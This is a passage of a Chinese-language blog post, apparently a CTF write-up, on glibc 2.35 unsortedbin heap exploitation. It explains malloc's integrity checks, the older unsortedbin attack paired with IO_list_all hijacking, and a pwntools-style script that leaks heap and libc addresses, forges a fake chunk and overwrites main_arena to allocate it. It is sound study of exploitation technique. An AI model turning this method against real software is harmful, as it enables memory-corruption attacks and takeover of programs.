next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure>
<p>unsorted_chunks(av)可以获取unsortedbin链表的链表头指针 当链表头的bk域指向自己 也就是链表中 链表头和链表尾都为同一个chunk的时候 说明这个链表中已经没有其他的chunk了 那么就不会进入while循环 这一个check看似简单 但是实际上起到了非常大的防御功能 我在伪造chunk时 就是无法绕过这一个check来跳过while循环<br>第一个check 检查victim的size是否符合要求<br>第二个和第三个check 检查victim物理相邻的chunk的size和prev_size是否符合要求<br>第四个check 检查victim上一个chunk(bck)的fd域是否指向victim 确保链表的完整性<br>第五个check 检查next_chunk的prev_size的inuse位 因为处于unsortedbin链表中的chunk肯定都是处于free状态的 如果inuse不为0 就触发报错<br>同时 在从unsortedbin中申请chunk后 还会有两句负责完善chunk的fd域和bk域 从而确保链表连通性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>这两句即是2.31版本以前的unsortedbin attack攻击手法所利用到的 通过覆盖unsortedbin chunk的bk域 将其修改为ptr_addr - 0x10 在执行到 bck-&gt;fd &#x3D; unsorted_chunks(av)时 就会往ptr_addr写入unsortedbin的链表头地址 配合io链就可以覆写IO_list_all 从而伪造io结构体 劫持程序执行流<br>但是在2.31以后 作者优化了对unsortedbin chunk的链表检查 在不修改main_arena的情况下 已经无法实现任意地址写了 在后续的步骤3中 我将说明如何通过修改main_arena来实现任意地址申请的逻辑漏洞<br>回到源代码中 如果要申请的chunk大小等于链表中的chunk大小 会先将符合要求的chunk转移到tcachebin中(如果对应链表尚有空闲) 随后在第二次执行时 由于链表已经为空不进入while循环 直接从tcachebin中申请chunk<br>如果大小不一致 会根据unsortedbin中的chunk大小来判断要将chunk放入largebin还是smallbin 随后再进行分配</p>
<p>如果想要伪造一个fake chunk加入unsortedbin链表 并且实现利用realloc函数把这个fake chunk申请出来 就需要更改链表头chunk的bk域<br>接下来 需要更改这个fake chunk的fd域 让其指向main_arena 同时要做好伪造 修改fake chunk的size域 以及其物理相邻的下一个chunk的chunk头信息也要做好伪造<br>做好这些前置工作 还需要绕过的判断就是 如何不进入while循环 只要我们没有完善链表结构 程序就会一直认为 链表中还存在chunk 就一直遍历 报错是必然发生的事<br>想要把fake chunk从链表中脱离出来 要解决的关键就是如下这个check</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk  </span><br><span class="line">bck = victim-&gt;bk;  </span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构  </span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))  </span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);  </span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av) </span><br></pre></td></tr></table></figure>
<p>Victim指向fake chunk   bck指向fake chunk的bk域<br>需要使得bck的fd域指向fake chunk 还需要使得fake chunk指向main_arena<br>看似很容易满足 但是关键是下次进入while循环时 victim就会指向bck<br>如果此时bck的bk域不等于main_arena 就会重新进入while循环 那么此时bck的链表结构又需要重新布置 并且进入死循环<br>但是实际上这是不可能的 除非我们去申请的是main_arena 但是这仍然需要我们拥有更改main_arena的权限 这样才能绕过size和prevsize的检查<br>那么既然必须更改main_arena 有没有更容易的篡改方案 首先把fake chunk的bk域改为指向unsorted_chunks(av) 那么while循环的check就可以绕过去了<br>接下来则是需要绕过bck-&gt;fd &#x3D;&#x3D; victim这一条判断<br>使得unsorted_chunks(av)指向victim 即修改main_arena+96+0x10处为vitcim</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = elf.bss(0x300)</span><br><span class="line">add(0x500,&quot;aaaa&quot;)#0</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#1</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#2</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">heap_addr = u64(io.recv(5).ljust(8,b&#x27;\x00&#x27;))&lt;&lt;12</span><br><span class="line">success(&quot;heap_addrr :&quot;+hex(heap_addr))</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1f2ce0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#3</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#4</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#5</span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#6</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#7</span><br><span class="line">delete(6)</span><br><span class="line">payload = p64(libc_addr + 0x1f2ce0)+p64(bss_addr)</span><br><span class="line"></span><br><span class="line">edit(6,len(payload),payload)</span><br><span class="line">any_write(p64(bss_addr+0x8),p64(0x30)+p64(heap_addr+0x7e0)+p64(libc_addr+0x1f2ce0))</span><br><span class="line">payload = p64(0x30)+p64(0x20)</span><br><span class="line">any_write(p64(bss_addr+0x30),payload)</span><br><span class="line">any_write(p64(libc_addr+0x1f2ce0+0x10),p64(bss_addr))</span><br><span class="line">gdb.attach(io,&#x27;b *malloc+10&#x27;)</span><br><span class="line">add(0x20,&quot;aaaa&quot;)#8</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png" alt="image.png"><br>可以成功的把伪造的fake chunk申请出来<br>为了实现这一次非法内存申请 需要泄露heap地址以及libc地址<br>修改unsortedbin chunk的bk域<br>修改fake chunk的size域 fd域 bk域 以及其next chunk的prev_size和size域<br>修改main_arena+96+0x10处为fake chunk<br>由此可见glibc2.35对于unsortedbin的检查十分严格 我们需要对内存空间有极大的可控制性才能绕过check</p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure
          class="avatar avatar-lg"
          data-initial="C"
          style="background-color: #3b4351;">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>C12en</div>
      <div>2024-11-23</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/wp/">wp</a>

      
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
